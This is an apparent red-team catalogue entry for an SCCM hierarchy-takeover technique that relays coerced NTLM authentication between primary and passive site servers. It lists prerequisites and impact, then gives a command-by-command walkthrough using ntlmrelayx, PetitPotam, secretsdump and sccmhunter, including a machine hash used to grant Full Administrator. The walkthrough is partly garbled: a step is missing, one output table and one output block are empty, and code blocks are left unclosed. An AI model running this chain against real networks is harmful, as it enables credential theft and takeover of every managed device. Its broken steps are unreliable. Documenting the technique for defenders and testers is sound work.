# TAKEOVER-7

## Description
Hierarchy Takeover via NTLM coercion and relay to SMB between primary and passive site servers

## ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-7.1: Coerce primary site server
    - TAKEOVER-7.2: Coerce passive site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Connectivity from the relay server to SMB on target host
- SMS Provider role installed on target preferred (default) but not required
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present [DEFAULT]
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
    - Coercion target is local admin (to access RPC/admin shares) [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
For high availability configurations, the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover.

During setup, the passive site server is [required](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#configurations-for-the-site-server-in-passive-mode) to be a member of the active site server's local Administrators group. An attacker who is able to successfully coerce NTLM authentication from a active or passive site server via SMB and relay it to SMB on a remote active or passive site server to compromise the host can either:
1. Authenticate to its own hosted SMS Provider as the site server
2. Authenticate to LDAP(s) as the site server and configure resource-based constrained delegation (RBCD) to impersonate an SCCM Full Administrator

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Subtechniques
- TAKEOVER-7.1: Coerce primary site server
- TAKEOVER-7.2: Coerce passive site server

## Examples
The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coercion target and relay target are opposite. This example is for TAKEOVER-7.1.

1. Use `SCCMHunter` to profile SCCM infrastructure:

    The results of the `find` module indicate:
    - The *SCCM.INTERNAL.LAB* and *PASSIVE.INTERNAL.LAB* sytems are both site servers in the "LAB" site
    - The *SCCM.INTERNAL.LAB* host is the active site server and the *PASSIVE.INTERNAL.LAB* host is the passive site server
    - SMB signing is disabled on both systems
    ```
    [04:24:43 PM] INFO     [+] Finished profiling Site Servers.
    [04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+

                        +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+
    ```

2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service on the primary site server identified in the previous step.  The `-socks` flag is used to hold the authenticated session open:
    ```
    └─# python3 ntlmrelayx.py -t smb://TARGET_SITE_SERVER -smb2support -socks

3. From the attacker host, coerce NTLM authentication from the passive site server via SMB, targeting the relay server's IP address:

    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP>

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
    [+] Connected!

    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the SMB service on the site server and the authenticated session is held open:

    ```
    Type help for list of commands
    ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121

    [*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)
    ```

 5. Proxy `secretsdump.py` in the context of the passive site server through the authenticated session to authenticate to the primary site server and recover its hashed credential:
    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]

    ```

6. Use `sccmhunter` as the primary site server to the Administration Service API and add an arbitrary user as Full Administrator:
    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
    └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121
